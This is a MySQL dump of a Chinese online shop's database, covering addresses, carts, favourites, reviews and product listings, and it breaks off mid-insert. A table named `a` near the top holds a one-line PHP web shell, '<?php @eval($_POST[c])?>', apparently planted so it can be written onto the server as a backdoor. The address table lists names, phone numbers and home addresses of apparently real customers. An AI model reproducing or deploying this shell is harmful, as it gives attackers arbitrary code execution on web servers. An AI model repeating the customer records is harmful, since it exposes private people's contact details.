-- phpMyAdmin SQL Dump
-- version 4.7.0
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: 2018-05-11 06:25:09
-- 服务器版本： 5.6.34-log
-- PHP Version: 7.1.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `shopp_database`
--

-- --------------------------------------------------------

--
-- 表的结构 `a`
--

CREATE TABLE `a` (
  `cmd` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- 转存表中的数据 `a`
--

INSERT INTO `a` (`cmd`) VALUES
('<?php @eval($_POST[c])?>');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_address`
--

CREATE TABLE `shopp_address` (
  `id` char(36) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `content` text NOT NULL,
  `user_id` char(36) NOT NULL,
  `user_name` varchar(30) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_address`
--

INSERT INTO `shopp_address` (`id`, `phone`, `content`, `user_id`, `user_name`) VALUES
('0D6464E2-26F3-1985-70CF-96A3FAC34C10', '18407721575', '广西壮族自治区  柳州市  鱼峰区', '90360C11-DAD9-FAEB-0B35-E5FBA3465373', '刘朝腾'),
('38CE3F7E-234B-6FFC-8AD2-B6C8F9DE7760', 'ttttt ', '湖北省 省直辖县级行政单位 潜江市 ', '9ABCC594-A89C-F8C1-527F-4542D55DEBDA', 'tt'),
('51ACBD4D-D334-089D-6DE8-B64A3D7889F6', '15207714044', '广西壮族自治区  柳州市  鱼峰区', 'AA692D26-B786-D8A0-1420-F8F33264485C', '寒风刺骨'),
('5ECDDA73-BA22-A68E-2973-BD417B0E2799', '18407721575', '广西壮族自治区北海市银海区', '6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780', '刘朝腾'),
('66CE42D3-87E4-CD64-DF80-B077A25A2A9B', '99009', '广西 柳州市 鱼峰区 ', '9ABCC594-A89C-F8C1-527F-4542D55DEBDA', '99'),
('8395DFB8-1652-4D91-E644-5B700E87B90B', '147258399978456', '广西壮族自治区  北海市  银海区', '23D07CF8-C7AA-8FD9-7D5D-EEDC16768C80', '阿里里'),
('9FCFCD11-56D4-5B8F-F261-C20A4B4A4A94', '15207774033', '广东省广州市海珠区新敦路115号', 'AA692D26-B786-D8A0-1420-F8F33264485C', '茶叶会'),
('B2F5AD66-234C-8E0C-8791-59B70AA9502F', '18407721575', '广西壮族自治区北海市银海区', '6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780', '刘朝腾'),
('EAD041E2-0547-1103-D620-B14E16EDD1A1', '12345678963', '广西壮族自治区  柳州市  鱼峰区', '6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780', '刘先生'),
('F153F405-D18C-499A-6DD1-C5BD5B63FB44', '15207714044', '广东省广州市海珠区新敦路115号', 'AA692D26-B786-D8A0-1420-F8F33264485C', '陈有欢');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_authority`
--

CREATE TABLE `shopp_authority` (
  `id` char(36) NOT NULL,
  `describe` varchar(250) NOT NULL,
  `rule` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_auth_group`
--

CREATE TABLE `shopp_auth_group` (
  `id` char(36) NOT NULL,
  `title` char(100) NOT NULL DEFAULT '',
  `status` int(1) NOT NULL DEFAULT '1',
  `rules` char(80) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_auth_group`
--

INSERT INTO `shopp_auth_group` (`id`, `title`, `status`, `rules`) VALUES
('F966ADA4-6A49-30FC-EF47-D6B1BF8F3BDC', '管理员', 1, 'administrator'),
('580D6AAE-5B5A-914B-5838-CD052F819229', '普通用户', 1, 'user');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_auth_group_access`
--

CREATE TABLE `shopp_auth_group_access` (
  `uid` mediumint(8) UNSIGNED NOT NULL,
  `group_id` mediumint(8) UNSIGNED NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_auth_rule`
--

CREATE TABLE `shopp_auth_rule` (
  `id` mediumint(8) UNSIGNED NOT NULL,
  `name` char(80) NOT NULL DEFAULT '',
  `title` char(20) NOT NULL DEFAULT '',
  `type` tinyint(1) NOT NULL DEFAULT '1',
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `condition` char(100) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_cart`
--

CREATE TABLE `shopp_cart` (
  `id` char(36) NOT NULL,
  `user_id` char(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_cart`
--

INSERT INTO `shopp_cart` (`id`, `user_id`) VALUES
('2A76B137-43BC-69F3-4378-761A8964DBAC', '9ABCC594-A89C-F8C1-527F-4542D55DEBDA'),
('34383404-566F-C790-6BAB-48A85225AA1F', '98EB35BE-CB9E-82A3-C458-5CD2A21BF59D'),
('5D0C16D6-32CF-EBF2-E21B-ACE4814D6C96', '90360C11-DAD9-FAEB-0B35-E5FBA3465373'),
('66D301DF-D579-9DF5-F674-B47A4BAA7404', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1'),
('77E476A4-2890-B3E2-7C9C-3EF78198D96D', '6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780'),
('80E9A923-F0C8-1105-A841-6CCCD3F33253', '10A7C5E7-090A-25C8-9C27-61B921F8FA49'),
('9A9E4CA4-5FA7-308B-D8B9-8E3170299DBC', 'B21F9581-65EA-6F68-8FAA-57E5CFA2B419'),
('A46507D0-84E3-6E38-2C7A-4C81B586277D', '039B2CF4-D872-080B-2E0F-D97589250C5D'),
('CD80475B-942E-E686-55D2-302363E3A2A3', '5D754767-F3D5-1D93-E588-856B288B08CC'),
('E1278ED5-CEE1-6CC4-D63A-788D82D8A4E8', 'AA692D26-B786-D8A0-1420-F8F33264485C'),
('F437F4E8-5BBC-420C-B1EC-A34A595FB74A', '23D07CF8-C7AA-8FD9-7D5D-EEDC16768C80'),
('F77903BE-80A4-B9BD-88F7-058666C0F8F1', '426D79CF-279A-2033-0A77-72166CC15CC1');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_cart_specification`
--

CREATE TABLE `shopp_cart_specification` (
  `id` char(36) NOT NULL,
  `specification_id` char(36) NOT NULL,
  `cart_id` char(36) NOT NULL,
  `count` int(10) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_cart_specification`
--

INSERT INTO `shopp_cart_specification` (`id`, `specification_id`, `cart_id`, `count`) VALUES
('0287C0CE-F13E-CD24-0711-005B3162E5F2', '9C4A4A94-DBAB-20BB-1D39-FE3EB8CD3810', 'E1278ED5-CEE1-6CC4-D63A-788D82D8A4E8', 2),
('42852EB5-7AE7-89DF-CE03-5B6E2351809D', '0E034B9B-648E-48D1-78D6-B0D615B6E06F', '66D301DF-D579-9DF5-F674-B47A4BAA7404', 1),
('4A890218-C78C-F5ED-B3E6-FEA3646050C9', '119CD58F-4126-CF58-BEC2-1567ADB34E05', '66D301DF-D579-9DF5-F674-B47A4BAA7404', 1),
('61A32965-3884-B2CA-4C70-314069AFB296', '406DEDB1-A1C0-7814-EAA6-8E80EEA2A97E', 'E1278ED5-CEE1-6CC4-D63A-788D82D8A4E8', 1),
('AA18C9B6-DBC6-C192-7BEF-389A7039F6DA', '06E57510-C770-4863-BAAD-BDA23210E8A4', '5D0C16D6-32CF-EBF2-E21B-ACE4814D6C96', 2),
('B6323F2D-D391-8EA7-D586-8D2F76338AC1', '3BE1F4C9-E437-BAD8-9019-423F492CF6B8', '77E476A4-2890-B3E2-7C9C-3EF78198D96D', 4),
('BB987504-74D5-A704-49DC-A99C77D403B2', '982053A9-49B6-5D90-754F-4A94B4C67133', 'A46507D0-84E3-6E38-2C7A-4C81B586277D', 3),
('C99B37FC-3B91-B7B9-8F7F-8073322CC0EE', 'B0EB8443-EC51-0147-8158-48E572A864AF', '5D0C16D6-32CF-EBF2-E21B-ACE4814D6C96', 3),
('D3936F72-95F8-F908-DE96-EB38DAC78D06', '9F2AA23F-FD6B-CC49-55F8-EF5F403D4296', '2A76B137-43BC-69F3-4378-761A8964DBAC', 4),
('D6A693F8-44E0-93B7-4EF9-B96D338E42E2', '7897433D-81EB-C106-90CC-BA8A9A1C8DA5', '77E476A4-2890-B3E2-7C9C-3EF78198D96D', 3),
('DF98E059-0E83-A7D3-371C-239E5B2BDB27', '1FFC4E4C-B777-D0B5-2B79-766B35713043', '66D301DF-D579-9DF5-F674-B47A4BAA7404', 5);

-- --------------------------------------------------------

--
-- 表的结构 `shopp_code`
--

CREATE TABLE `shopp_code` (
  `id` char(36) NOT NULL,
  `code` varchar(10) NOT NULL,
  `create_time` varchar(50) NOT NULL,
  `type` varchar(10) NOT NULL,
  `key` varchar(50) NOT NULL,
  `phone` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_collect`
--

CREATE TABLE `shopp_collect` (
  `id` varchar(36) NOT NULL,
  `user_id` varchar(36) NOT NULL,
  `commodity_id` varchar(36) NOT NULL,
  `creation_time` varchar(40) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_collect`
--

INSERT INTO `shopp_collect` (`id`, `user_id`, `commodity_id`, `creation_time`) VALUES
('012CDD37-9387-F541-4F72-40DEFBA3EA51', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '76B76EF4-179E-352C-2A1B-1A7020C43172', '1493088952'),
('0933F13F-D5D9-F8B0-7629-C561D8E42DF6', '5D754767-F3D5-1D93-E588-856B288B08CC', '179149C6-2255-FAA2-F9F8-CA6608080FAA', '1487170028'),
('18986546-E777-C595-DCF8-ADDC3A185B9F', '5D754767-F3D5-1D93-E588-856B288B08CC', '753C793E-1F5D-1DC7-4103-A23D23E016C2', '1487170021'),
('1E11DADF-860B-27E7-43EB-4C87C92F17E8', '5D754767-F3D5-1D93-E588-856B288B08CC', '22B10E64-2792-9976-E179-2481FBD15CB5', '1487528525'),
('2686F7F1-DB91-9476-2319-E87BBC4705C7', 'AA692D26-B786-D8A0-1420-F8F33264485C', '38B3FE41-5AB1-F2AF-3446-7E07D8DD8851', '1491988997'),
('3819D231-DDB6-035D-E079-E70B0C7F11D3', '5D754767-F3D5-1D93-E588-856B288B08CC', 'D678064A-D80E-EFA2-4A01-873583FF3E9B', '1487170025'),
('3FEDF67C-ED62-6E52-31BF-9FC9A1F37817', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '934AE8D8-B061-C383-3FE1-6566C597B7F4', '1493088527'),
('48E55473-F52F-5D37-23B8-C219AD7A3923', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '1C26D516-A5F1-7C2E-7158-8A658A3F9083', '1493088512'),
('513468C6-75C2-F079-1446-0950E261DFF9', '90360C11-DAD9-FAEB-0B35-E5FBA3465373', '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D', '1509794250'),
('6F588002-A221-016D-EF14-063AB394BCE4', '5D754767-F3D5-1D93-E588-856B288B08CC', '934AE8D8-B061-C383-3FE1-6566C597B7F4', '1485160350'),
('736B6887-EC32-8DB5-8134-1A19EC402221', 'AA692D26-B786-D8A0-1420-F8F33264485C', '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE', '1505449874'),
('8053C695-9C0F-75C5-89CA-799A5E298CA8', '5D754767-F3D5-1D93-E588-856B288B08CC', 'C3E30939-86EB-730F-900E-17B582155781', '1486699401'),
('891EB57B-4EC5-C352-FF06-8276D8708AE2', '5D754767-F3D5-1D93-E588-856B288B08CC', '38B3FE41-5AB1-F2AF-3446-7E07D8DD8851', '1487526209'),
('895DDA13-7C0E-7313-1333-0431325C4702', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '22B10E64-2792-9976-E179-2481FBD15CB5', '1493088504'),
('94D1AD21-8345-20E1-52AD-DE8441CE0697', 'AA692D26-B786-D8A0-1420-F8F33264485C', '37B10231-4225-C269-DB28-F1C40A6CA448', '1491013063'),
('98760AA2-3C09-F263-E561-921E5661520F', '5D754767-F3D5-1D93-E588-856B288B08CC', 'FEF2C2E1-6304-F2CF-C1C7-EA18C9C219EC', '1484745758'),
('AB923F67-E31D-32EA-C8B5-C1515563C593', 'AA692D26-B786-D8A0-1420-F8F33264485C', 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', '1491037064'),
('BEBB89DB-ECB5-2BC8-D36C-B58DE79BBC8D', '5D754767-F3D5-1D93-E588-856B288B08CC', 'D708E35B-239A-0E3B-3988-B7EA5C3A3066', '1484728832'),
('C7A52854-542F-2F9D-214B-1A2FFF7FC2F2', '5D754767-F3D5-1D93-E588-856B288B08CC', '629BAE4F-B30D-D852-BFE6-A43A373A2ED8', '1486699415'),
('C8A15885-4628-EFB4-AEB6-6AB29CB61108', '5D754767-F3D5-1D93-E588-856B288B08CC', 'D2BCDC64-0970-3775-3193-6D870A490A84', '1487170036'),
('CCA5A3D4-7F0C-0526-00B3-1829549961C2', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', 'B763DD16-2E58-C493-0434-3952FA160C17', '1493088958'),
('D9C5A264-E1CC-FCF0-14D8-4F34F15E0506', '5D754767-F3D5-1D93-E588-856B288B08CC', 'D5CD3549-48F1-F39A-F547-EF40372ECC5D', '1487170039'),
('DC251D4B-A682-6867-FC4A-96855D5F5C46', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '37B10231-4225-C269-DB28-F1C40A6CA448', '1493088517'),
('DDA8EF38-2184-8F3B-532F-0F6774E3C741', '5D754767-F3D5-1D93-E588-856B288B08CC', '72387161-B237-7FC1-3FB3-E78C23533C5C', '1487170033'),
('E15310D0-8D62-B658-1627-BE3F7560D2B9', 'AA692D26-B786-D8A0-1420-F8F33264485C', 'C3E30939-86EB-730F-900E-17B582155781', '1491013058'),
('EEE59FE2-F221-D145-3BEE-74D172448DD1', '85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE', '1493088507');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_comment`
--

CREATE TABLE `shopp_comment` (
  `id` char(36) NOT NULL,
  `content` text NOT NULL,
  `grade` double(2,0) NOT NULL COMMENT '星级1 2 3 4 5 6 7 8 9 10',
  `creation_time` char(255) NOT NULL,
  `user_id` char(36) NOT NULL,
  `order_specification_id` char(36) NOT NULL,
  `status` varchar(10) NOT NULL,
  `order_id` char(36) NOT NULL,
  `commodity_id` char(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_comment`
--

INSERT INTO `shopp_comment` (`id`, `content`, `grade`, `creation_time`, `user_id`, `order_specification_id`, `status`, `order_id`, `commodity_id`) VALUES
('78448CDD-7B08-8947-7F43-F247CEBEA266', '还不错哟！！', 3, '1505975036', 'AA692D26-B786-D8A0-1420-F8F33264485C', 'DB9CB86C-2169-9117-B19F-9C536E983A72', '0', '644ED6F9-40DA-D8C8-D04A-4200EAD103E3', '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D'),
('921B24F5-BB4F-3872-4D4F-63562D060803', '再次光临！！！非常棒！！', 4, '1505975293', 'AA692D26-B786-D8A0-1420-F8F33264485C', '539E5507-9E1A-7C03-616B-02F3C9F301B9', '0', '0C0E88EF-C792-CE28-6E48-3CF9AD985E41', '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D'),
('CE987F68-6C92-19D7-A52E-FF29DBC49FB9', '垃圾货', 2, '1499406758', 'AA692D26-B786-D8A0-1420-F8F33264485C', '609BBF8D-43BC-B025-184E-4AA673E7D16F', '0', '145C9BF4-D775-9C85-D661-688DB9245D1F', '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE'),
('E32BD1E1-282D-C7FF-C6C9-251F2A07F1E8', '手机马马虎虎吧，没有理想中的好！', 5, '1493096683', 'AA692D26-B786-D8A0-1420-F8F33264485C', 'CAEE9E79-8C85-A650-0821-708BEC771B76', '0', 'D0F3B8C1-E407-4ED9-2800-2F78F697D5C3', '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_comment_images`
--

CREATE TABLE `shopp_comment_images` (
  `id` char(36) NOT NULL,
  `comment_id` char(36) NOT NULL,
  `image` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_comment_images`
--

INSERT INTO `shopp_comment_images` (`id`, `comment_id`, `image`) VALUES
('055C1C13-4362-1523-8D8A-698D9E7ED9FF', '78448CDD-7B08-8947-7F43-F247CEBEA266', '5A146795-75B5-EDD2-84F2-5C4F1D20A16B.png'),
('091895F9-BC22-A009-FECC-AB8357AFF8DD', '78448CDD-7B08-8947-7F43-F247CEBEA266', '59D7FE7A-5DC4-210A-5EA1-F5274143E3E6.png'),
('0A254907-F7E6-5643-3344-3FE85BD9570D', '78448CDD-7B08-8947-7F43-F247CEBEA266', '5CF55321-C201-24D1-EA69-49A737912ADA.png'),
('40A9949F-AFB2-D040-68FD-B40F2ED752E2', '78448CDD-7B08-8947-7F43-F247CEBEA266', 'F78B8CFE-93DC-509B-7F6F-3B53EE417A62.png'),
('5E21DF6C-CF86-B4DC-54BF-D28F4ECD2DB5', '78448CDD-7B08-8947-7F43-F247CEBEA266', '0BC31FC3-B169-CC2D-5DCC-5EADF3F2E247.png'),
('66095751-2C4A-BCB8-0081-6097B2C20893', '921B24F5-BB4F-3872-4D4F-63562D060803', '552B2AD2-CCE9-365D-E255-2631DEC1071A.png'),
('7A5FC9BF-51EA-290A-B5C1-C13A89559162', '78448CDD-7B08-8947-7F43-F247CEBEA266', '3F26D18C-9301-7F79-3AB7-FD831005DAAB.png'),
('9FAB6687-4DC2-FE8E-63CB-5ED16CA09F56', '921B24F5-BB4F-3872-4D4F-63562D060803', '39357F8E-81C4-BA70-F3FB-BAEFFB50BA42.png'),
('BAB33590-BA4A-4535-E364-D5057946D029', '921B24F5-BB4F-3872-4D4F-63562D060803', 'EFD44A88-2E73-20C1-7533-13B4E70BEFBD.png'),
('CF6472B3-3994-9F10-8EED-B63D4C5842AA', '78448CDD-7B08-8947-7F43-F247CEBEA266', 'FBE18E1E-BEA3-C81D-4634-C622E0C77422.png'),
('D8B13BE6-A056-E0A2-1959-0FBD37A3EA9E', '921B24F5-BB4F-3872-4D4F-63562D060803', '5A5F780D-5EF9-D364-9C82-829812D6D3AE.png'),
('DA8109CE-4D16-B67A-65DC-8BF5450D6844', '921B24F5-BB4F-3872-4D4F-63562D060803', 'C427E948-3BD5-375B-6D56-C03D7C3805A1.png'),
('F8C3A78A-2341-1233-BADB-3F30EEB7A928', '78448CDD-7B08-8947-7F43-F247CEBEA266', '70211AA6-78FC-1994-E693-F9AF631B87B4.png'),
('FA8644E6-25BC-1C5E-B105-AAF04B5DCC54', '921B24F5-BB4F-3872-4D4F-63562D060803', 'AE38117F-ED70-E36A-1C3D-17447BEC2387.png');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_comment_reply`
--

CREATE TABLE `shopp_comment_reply` (
  `id` varchar(36) NOT NULL,
  `content` text NOT NULL,
  `comment_id` varchar(36) NOT NULL,
  `user_id` varchar(36) NOT NULL,
  `creation_time` varchar(40) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_commodity`
--

CREATE TABLE `shopp_commodity` (
  `id` char(36) NOT NULL,
  `title` varchar(250) NOT NULL,
  `describe` text,
  `staistics` int(11) NOT NULL,
  `parameter` text NOT NULL,
  `creation_time` varchar(50) NOT NULL,
  `out_time` varchar(50) NOT NULL,
  `type_id` char(36) NOT NULL,
  `grade` varchar(10) NOT NULL,
  `states` int(2) NOT NULL,
  `icon` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_commodity`
--

INSERT INTO `shopp_commodity` (`id`, `title`, `describe`, `staistics`, `parameter`, `creation_time`, `out_time`, `type_id`, `grade`, `states`, `icon`) VALUES
('00D84306-7B0D-F027-28E4-09D70124D2CB', '包邮 韩国菲诗小铺双头自动旋转眉笔一字眉 防水防汗带眉刷非眉粉', '扁平型笔芯设计，扁平口保护笔芯！扁平眉笔可以大面积的均匀上色，笔芯软硬适中，使眉毛看起来更加自然。眉笔还有一个小技巧，深棕色系眉笔还可以做阴影哈！', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"The Face Shop\",\"\\u51c0\\u542b\\u91cf\":\"0.3g\",\"\\u5f69\\u5986\\u5206\\u7c7b\":\"\\u7709\\u7b14\",\"\\u529f\\u6548\":\"\\u9632\\u6c34 \\u9501\\u8272\",\"\\u4fdd\\u8d28\\u671f\":\"3\\u5e74\"}', '1486201101', '1517673600', 'F994FC1C-7A5F-16A6-70E4-1672633B13D6', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('0F0CD553-FCD9-655A-228F-1F57509DD264', '新一轮的大冬瓜来啦！瓜皇瓜后瓜太子！定购包您满意！敬请来电！', '                    团东村雅王坡冬瓜大户黑皮大冬瓜现可预购！【冬瓜大！圆又长，瓜皮黑，绝对惊艳到你！】！有意向大老板可以点击上方【联系瓜农】致电瓜农，询问更加详细的信息，约定合适的时间看瓜！                ', 0, '{\"\\u74dc\\u957f\":\"2\"}', '1526005902', '1589126400', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 0, 'C7C3974F-F0E7-C732-C793-AF51303BD0C2.png'),
('1581855B-4F44-E6F1-8E95-59AD9A5A0C5D', '重庆磁器口手工陈建平陈麻花500g四川美食特产香酥糕点心零食天津 ', '                    磁器口排队那家！我们是厂家直接送货，质量保证！麻花是易碎物品，在快递过程中我们不能保证不碎，我们只能是保证要尽心尽力的包装好，追求完美的朋友希望慎重，谢谢！2包包邮，全场48元包邮（除新疆西藏内蒙等地）                ', 2, '{\"\\u5382\\u5740\":\"\\u91cd\\u5e86\\u5e02\\u6c99\\u576a\\u575d\\u533a\\u78c1\\u5668\\u53e3\\u6b63\\u885772\",\"\\u4fdd\\u8d28\\u671f\":\"270\"}', '1487261125', '1550332800', '25D26743-4E79-4489-AB85-C6B773BA6588', '8', 1, 'AA55FB3D-7512-7C3A-8ED9-5133660998E7.png'),
('179149C6-2255-FAA2-F9F8-CA6608080FAA', '电器插头挂钩 电源线插座支架收纳整理架 创意百货 2个装 ', '极有家认证[优质网店]：11年好店，权威认证，买退无忧', 0, '{\"\\u627f\\u91cd\":\"1kg\\u4ee5\\u4e0b\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u68d5\\u8272 \\u767d\\u8272 \\u9ed1\\u8272 \\u7eff\\u8272\",\"\\u5438\\u9644\\u65b9\\u5f0f\":\"\\u7c98\\u80f6\",\"\\u6750\\u8d28\":\"\\u5851\\u6599\"}', '1486199439', '1580745600', 'D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('1C26D516-A5F1-7C2E-7158-8A658A3F9083', '27寸大屏2K液晶电脑显示器 IPS高清1080PS4游戏制图显示屏HDMI ', '                                                            27寸大屏幕 IPS屏 高清分辨率 游戏 PS4                                                 ', 0, '{\"\\u5236\\u9020\\u5546\\u540d\\u79f0\":\"\\u6df1\\u5733\\u5e02\\u540e\\u601d\\u79d1\\u6280\\u6709\\u9650\\u516c\\u53f8\",\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"\\u6db2\\u6676\\u663e\\u793a\\u5668\",\"\\u578b\\u53f7\":\"BKA270\",\"\\u6444\\u50cf\\u5934\\u7c7b\\u578b\":\"\\u65e0\\u6444\\u50cf\\u5934\",\"\\u7535\\u6c60\":\"6000\\u6beb\\u5b89\"}', '1482860943', '1483718400', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('21B3CE06-EBCB-ECA1-E311-88D1C759C156', '韩国deHub吸盘衣帽挂钩 厨房浴室卧室尖头无痕免钉不掉落挂钩百货 ', '①钩子为加长型，可挂带子很款的包包。②可贴大头贴，公司logo。③细小的尖头可穿很小的孔洞。④适合挂各种东西，只有您想不到的，没有挂不了的。⑤承重力5kg，粗糙面也可用。⑥ 重点是：此款还包邮哦，亲！', 0, '{\"\\u54c1\\u724c\":\"deHub\",\"\\u627f\\u91cd\":\"3kg(\\u4e0d\\u542b)-5kg\\uff08\\u542b\\uff09\",\"\\u8d27\\u53f7\":\"AHK60\",\"\\u5438\\u9644\\u65b9\\u5f0f\":\"\\u5438\\u76d8\",\"\\u6750\\u8d28\":\"\\u5851\\u6599\"}', '1486199169', '1580745600', 'D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('22B10E64-2792-9976-E179-2481FBD15CB5', 'Apple/苹果 iPhone 7 Plus 苹果7 5.5寸国行港版现货 7p 7代手机 ', '新iphone特性：新增亮面黑，压力感应HOME键，ip67级防水防尘，1200w像素光学防抖，全新A10处理器，续航提升，立体扬声器 ，lightning耳机接入方式，双摄像头。 现货发！按订单顺序发货', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"iPhone 7 Plus\",\"iPhone 7 Plus\":\" 5.5\\u82f1\\u5bf8\",\"\\u7f51\\u7edc\\u7c7b\\u578b:\":\"4G\\u5168\\u7f51\\u901a\",\"\\u5b58\\u50a8\\u5bb9\\u91cf\":\"32GB 128GB 256GB\",\"\\u539a\\u5ea6\":\"7.3 \\u6beb\\u7c73 (0.29 \\u82f1\\u5bf8)\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"1200 \\u4e07\\u50cf\\u7d20\\u5e7f\\u89d2\\u53ca\\u957f\"}', '1484925630', '1486742400', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('241411DE-FEBB-E3B4-4FE8-F73BDE54B32B', 'AEJE 5.1家庭影院音响套装家用ktv音箱客厅低音炮蓝牙hdmi功放机 ', 'AEJE发烧高清震撼5.1家庭影院 ● 含一台高清多功能蓝牙5.1功放 + 一套AEJE原装品质高清5.1音箱 ● 功放支持DTS/杜比解码、HDMI高清3入1出端口、单独6声道支持有/无源炮、内置蓝牙、USB、双人同时K歌，FM收音等【可用淘金币抵钱】升级功放享大优惠 ● 下单立赠7件套', 0, '{\"CCC\\u8bc1\\u4e66\\u7f16\\u53f7\":\"2013010802653540\",\"\\u4f4e\\u97f3\\u97f3\\u7bb1\\u4e2a\\u6570\":\"1\\u4e2a\",\"\\u4e2d\\u7f6e(\\u4e3b\\u97f3)\\u97f3\\u7bb1\\u4e2a\\u6570\":\"1\\u4e2a\",\"\\u524d\\u7f6e(\\u5de6\\u53f3)\\u97f3\\u7bb1\\u4e2a\\u6570\":\"2\\u4e2a\",\"\\u540e\\u7f6e(\\u73af\\u7ed5)\\u97f3\\u7bb1\\u4e2a\\u6570\":\"2\\u4e2a\",\"\\u4e3b\\u673a\\u7c7b\\u578b\":\"\\u4ec5\\u6709\\u529f\\u653e\\u65e0\\u789f\\u673a\",\"\\u89c6\\u9891\\u8fde\\u63a5\\u65b9\\u5f0f\":\"HDMI \\u8272\\u5dee\\u5206\\u91cf\",\"\\u97f3\\u6548\\u6a21\\u5f0f\":\"DTS Dolby Digital\"}', '1486188726', '1580745600', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3', '拉夏贝尔2017春款新品 条纹方领九分袖衬衫式连衣裙10012162 ', '拉夏贝尔2017春款新品 条纹方领九分袖衬衫式连衣裙10012162 ', 0, '{\"\\u6750\\u8d28\\u6210\\u5206\":\"\\u68c9100%\",\"\\u9500\\u552e\\u6e20\\u9053\\u7c7b\\u578b\":\"\\u5546\\u573a\\u540c\\u6b3e\"}', '1484975106', '1579536000', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
